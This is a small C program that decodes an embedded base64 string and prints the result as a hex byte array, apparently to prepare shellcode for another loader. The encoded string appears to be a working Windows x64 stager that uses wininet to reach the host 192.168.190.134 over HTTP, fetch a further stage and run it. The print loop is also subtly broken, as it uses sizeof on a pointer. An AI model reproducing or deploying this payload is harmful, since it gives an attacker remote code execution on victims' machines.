#include <windows.h>
#include <stdio.h>


int b64index(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}


int base64_decode(const char* input, unsigned char* output) {
    int len = strlen(input);
    int out_idx = 0, val = 0, valb = -8;

    for (int i = 0; i < len; i++) {
        int idx = b64index(input[i]);
        if (idx == -1) continue;
        val = (val << 6) + idx;
        valb += 6;
        if (valb >= 0) {
            output[out_idx++] = (val >> valb) & 0xFF;
            valb -= 8;
        }
    }

    return out_idx;
}


int main() {
	

	const char* base64 = "/EiD5PDozAAAAEFRQVBSSDHSZUiLUmBIi1IYSItSIFFWSA+3SkpIi3JQTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJIi1Igi0I8QVFIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0ESLQCBJAdCLSBhQ41ZI/8lBizSITTHJSAHWSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEFYQVhIAdBeWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1PocAAAAE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC4wLjAgU2FmYXJpLzUzNy4zNgBZU1pNMcBNMclTU0m6OlZ5pwAAAAD/1egQAAAAMTkyLjE2OC4xOTAuMTM0AFpIicFJx8BQAAAATTHJU1NqA1NJuleJn8YAAAAA/9XoSwAAAC91d0RpWVJOcmNtek83TV91cHNBQlB3al9sbmlrNDg3X0dhQjJTTXRlMWxqWGZEUHQ5OUZidFFBWDVxVmIxUmlBVEpPbnF2eHUtAEiJwVNaQVhNMclTSLgAAiiEAAAAAFBTU0nHwutVLjv/1UiJxmoKX1NaSInxTTHJTTHJU1NJx8ItBhh7/9WFwHUfSMfBiBMAAEm6RPA14AAAAAD/1Uj/z3QC68zoVQAAAFNZakBaSYnRweIQScfAABAAAEm6WKRT5QAAAAD/1UiTU1NIiedIifFIidpJx8AAIAAASYn5SboSloniAAAAAP/VSIPEIIXAdLJmiwdIAcOFwHXSWMNYagBZScfC8LWiVv/V";
DWORD shellcodeLen = 711;


    BYTE* shellcode = (BYTE*)malloc(shellcodeLen);
    if (!shellcode) {
        fprintf(stderr, "Memory allocation failed.\n");
        return 1;
    }

    base64_decode(base64, shellcode);


    int idx = 0;
	while ( idx < sizeof(shellcode))
	{
		if (idx == (sizeof(shellcode) - 1) )
		{
			printf("0x%02x ", (unsigned char)shellcode[idx]);
		}
		else
		{
			printf("0x%02x, ", (unsigned char)shellcode[idx]);
		}
		idx++;
	}
	

    free(shellcode);
    return 0;
}
